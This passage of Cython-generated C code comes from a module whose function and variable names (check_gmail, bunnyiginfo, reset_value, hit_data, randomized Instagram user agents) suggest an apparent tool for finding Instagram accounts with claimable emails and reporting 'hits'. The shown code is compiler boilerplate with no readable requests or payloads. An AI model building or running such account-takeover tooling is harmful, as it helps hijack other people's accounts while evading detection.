      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_15);
      __pyx_t_15 = 0;

      
      __pyx_t_15 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 332, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_15);
      if (PyDict_SetItem(__pyx_t_15, __pyx_n_s_params, __pyx_v_data) < 0) __PYX_ERR(0, 332, __pyx_L3_error)

      
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_6, __pyx_t_15); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 330, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

    
    __pyx_t_14 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_14) {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L7_try_return:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L0;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_21);
  __Pyx_AddTraceback("source.bunnyiginfo", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_user_data);
  __Pyx_XDECREF(__pyx_v_reset_value);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_is_business);
  __Pyx_XDECREF(__pyx_v_followers);
  __Pyx_XDECREF(__pyx_v_user_id);
  __Pyx_XDECREF(__pyx_v_account_year);
  __Pyx_XDECREF(__pyx_v_header);
  __Pyx_XDECREF(__pyx_v_hit_data);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_inline_keyboard);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_9bunny(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_9bunny = {"bunny", (PyCFunction)__pyx_pw_6source_9bunny, METH_O, 0};
static PyObject *__pyx_pw_6source_9bunny(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("bunny (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_8bunny(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8bunny(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_jj = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  PyObject *__pyx_t_8 = NULL;
  PyObject *(*__pyx_t_9)(PyObject *);
  int __pyx_t_10;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("bunny", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_check_gmail); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 340, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_email);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 340, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_Equals(__pyx_n_u_good, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 340, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (__pyx_t_7) {

        
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_email, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 341, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_kp_u__16) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u__16);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 341, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
          PyObject* sequence = __pyx_t_4;
          Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
          if (unlikely(size != 2)) {
            if (size > 2) __Pyx_RaiseTooManyValuesError(2);
            else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
            __PYX_ERR(0, 341, __pyx_L3_error)
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          if (likely(PyTuple_CheckExact(sequence))) {
            __pyx_t_5 = PyTuple_GET_ITEM(sequence, 0); 
            __pyx_t_6 = PyTuple_GET_ITEM(sequence, 1); 
          } else {
            __pyx_t_5 = PyList_GET_ITEM(sequence, 0); 
            __pyx_t_6 = PyList_GET_ITEM(sequence, 1); 
          }
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          #else
          __pyx_t_5 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 341, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_6 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 341, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          #endif
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        } else {
          Py_ssize_t index = -1;
          __pyx_t_8 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 341, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_9 = Py_TYPE(__pyx_t_8)->tp_iternext;
          index = 0; __pyx_t_5 = __pyx_t_9(__pyx_t_8); if (unlikely(!__pyx_t_5)) goto __pyx_L10_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_5);
          index = 1; __pyx_t_6 = __pyx_t_9(__pyx_t_8); if (unlikely(!__pyx_t_6)) goto __pyx_L10_unpacking_failed;
          __Pyx_GOTREF(__pyx_t_6);
          if (__Pyx_IternextUnpackEndCheck(__pyx_t_9(__pyx_t_8), 2) < 0) __PYX_ERR(0, 341, __pyx_L3_error)
          __pyx_t_9 = NULL;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          goto __pyx_L11_unpacking_done;
          __pyx_L10_unpacking_failed:;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_9 = NULL;
          if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
          __PYX_ERR(0, 341, __pyx_L3_error)
          __pyx_L11_unpacking_done:;
        }
        __pyx_v_username = __pyx_t_5;
        __pyx_t_5 = 0;
        __pyx_v_jj = __pyx_t_6;
        __pyx_t_6 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_bunnyiginfo); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 342, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_10 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_6)) {
          PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_v_username, __pyx_v_jj};
          __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 342, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_GOTREF(__pyx_t_4);
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
          PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_v_username, __pyx_v_jj};
          __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 342, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_GOTREF(__pyx_t_4);
        } else
        #endif
        {
          __pyx_t_8 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 342, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_8);
          if (__pyx_t_5) {
            __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_5); __pyx_t_5 = NULL;
          }
          __Pyx_INCREF(__pyx_v_username);
          __Pyx_GIVEREF(__pyx_v_username);
          PyTuple_SET_ITEM(__pyx_t_8, 0+__pyx_t_10, __pyx_v_username);
          __Pyx_INCREF(__pyx_v_jj);
          __Pyx_GIVEREF(__pyx_v_jj);
          PyTuple_SET_ITEM(__pyx_t_8, 1+__pyx_t_10, __pyx_v_jj);
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_8, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 342, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        }
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        goto __pyx_L9;
      }

      
      /*else*/ {
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_orta_mail); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 344, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = __Pyx_PyInt_AddObjC(__pyx_t_4, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 344, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_orta_mail, __pyx_t_6) < 0) __PYX_ERR(0, 344, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      }
      __pyx_L9:;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_10) {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("source.bunny", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_jj);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_11bunnycheck(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_11bunnycheck = {"bunnycheck", (PyCFunction)__pyx_pw_6source_11bunnycheck, METH_O, 0};
static PyObject *__pyx_pw_6source_11bunnycheck(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("bunnycheck (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_10bunnycheck(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_10bunnycheck_1bunny_user_agent(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_10bunnycheck_1bunny_user_agent = {"bunny_user_agent", (PyCFunction)__pyx_pw_6source_10bunnycheck_1bunny_user_agent, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_10bunnycheck_1bunny_user_agent(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("bunny_user_agent (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_10bunnycheck_bunny_user_agent(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_10bunnycheck_bunny_user_agent(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_ii = NULL;
  PyObject *__pyx_v_aa = NULL;
  PyObject *__pyx_v_ss = NULL;
  PyObject *__pyx_v_dd = NULL;
  PyObject *__pyx_v_cc = NULL;
  PyObject *__pyx_v_lan = NULL;
  PyObject *__pyx_v_dp = NULL;
  PyObject *__pyx_v_arm = NULL;
  PyObject *__pyx_v_comb = NULL;
  PyObject *__pyx_v_sos = NULL;
  PyObject *__pyx_v_vlo = NULL;
  PyObject *__pyx_v_lop = NULL;
  PyObject *__pyx_v_ki = NULL;
  PyObject *__pyx_v_mo = NULL;
  PyObject *__pyx_v_user_agent = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  Py_UCS4 __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("bunny_user_agent", 0);
  __pyx_t_1 = PyList_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 360, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_kp_u_165_1_0_29_119);
  __Pyx_GIVEREF(__pyx_kp_u_165_1_0_29_119);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_165_1_0_29_119);
  __Pyx_INCREF(__pyx_kp_u_166_0_0_30_120);
  __Pyx_GIVEREF(__pyx_kp_u_166_0_0_30_120);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u_166_0_0_30_120);
  __Pyx_INCREF(__pyx_kp_u_167_0_0_31_121);
  __Pyx_GIVEREF(__pyx_kp_u_167_0_0_31_121);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_167_0_0_31_121);
  __Pyx_INCREF(__pyx_kp_u_168_0_0_32_122);
  __Pyx_GIVEREF(__pyx_kp_u_168_0_0_32_122);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_kp_u_168_0_0_32_122);
  __pyx_v_ii = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_720dpi);
  __Pyx_GIVEREF(__pyx_kp_u_720dpi);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_720dpi);
  __Pyx_INCREF(__pyx_kp_u_1080dpi);
  __Pyx_GIVEREF(__pyx_kp_u_1080dpi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_1080dpi);
  __Pyx_INCREF(__pyx_kp_u_1440dpi);
  __Pyx_GIVEREF(__pyx_kp_u_1440dpi);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_1440dpi);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_28_9, __pyx_t_2) < 0) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 363, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_720dpi);
  __Pyx_GIVEREF(__pyx_kp_u_720dpi);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_720dpi);
  __Pyx_INCREF(__pyx_kp_u_1080dpi);
  __Pyx_GIVEREF(__pyx_kp_u_1080dpi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_1080dpi);
  __Pyx_INCREF(__pyx_kp_u_1440dpi);
  __Pyx_GIVEREF(__pyx_kp_u_1440dpi);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_1440dpi);
  __Pyx_INCREF(__pyx_kp_u_2160dpi);
  __Pyx_GIVEREF(__pyx_kp_u_2160dpi);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_kp_u_2160dpi);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_29_10, __pyx_t_2) < 0) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 364, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_1080dpi);
  __Pyx_GIVEREF(__pyx_kp_u_1080dpi);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_1080dpi);
  __Pyx_INCREF(__pyx_kp_u_1440dpi);
  __Pyx_GIVEREF(__pyx_kp_u_1440dpi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_1440dpi);
  __Pyx_INCREF(__pyx_kp_u_2160dpi);
  __Pyx_GIVEREF(__pyx_kp_u_2160dpi);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_2160dpi);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_30_11, __pyx_t_2) < 0) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 365, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_1440dpi);
  __Pyx_GIVEREF(__pyx_kp_u_1440dpi);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_1440dpi);
  __Pyx_INCREF(__pyx_kp_u_2160dpi);
  __Pyx_GIVEREF(__pyx_kp_u_2160dpi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_2160dpi);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_31_12, __pyx_t_2) < 0) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_aa = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 367, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 367, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_1280x720);
  __Pyx_GIVEREF(__pyx_kp_u_1280x720);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_1280x720);
  __Pyx_INCREF(__pyx_kp_u_1920x1080);
  __Pyx_GIVEREF(__pyx_kp_u_1920x1080);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_1920x1080);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_720dpi, __pyx_t_2) < 0) __PYX_ERR(0, 367, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 368, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_1920x1080);
  __Pyx_GIVEREF(__pyx_kp_u_1920x1080);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_1920x1080);
  __Pyx_INCREF(__pyx_kp_u_2560x1440);
  __Pyx_GIVEREF(__pyx_kp_u_2560x1440);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_2560x1440);
  __Pyx_INCREF(__pyx_kp_u_3840x2160);
  __Pyx_GIVEREF(__pyx_kp_u_3840x2160);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_3840x2160);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_1080dpi, __pyx_t_2) < 0) __PYX_ERR(0, 367, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 369, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_2560x1440);
  __Pyx_GIVEREF(__pyx_kp_u_2560x1440);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_2560x1440);
  __Pyx_INCREF(__pyx_kp_u_3840x2160);
  __Pyx_GIVEREF(__pyx_kp_u_3840x2160);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_3840x2160);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_1440dpi, __pyx_t_2) < 0) __PYX_ERR(0, 367, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 370, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_3840x2160);
  __Pyx_GIVEREF(__pyx_kp_u_3840x2160);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_3840x2160);
  __Pyx_INCREF(__pyx_kp_u_7680x4320);
  __Pyx_GIVEREF(__pyx_kp_u_7680x4320);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u_7680x4320);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_2160dpi, __pyx_t_2) < 0) __PYX_ERR(0, 367, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_ss = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 372, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_u_SM_T292);
  __Pyx_GIVEREF(__pyx_kp_u_SM_T292);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_SM_T292);
  __Pyx_INCREF(__pyx_kp_u_SM_G973F);
  __Pyx_GIVEREF(__pyx_kp_u_SM_G973F);
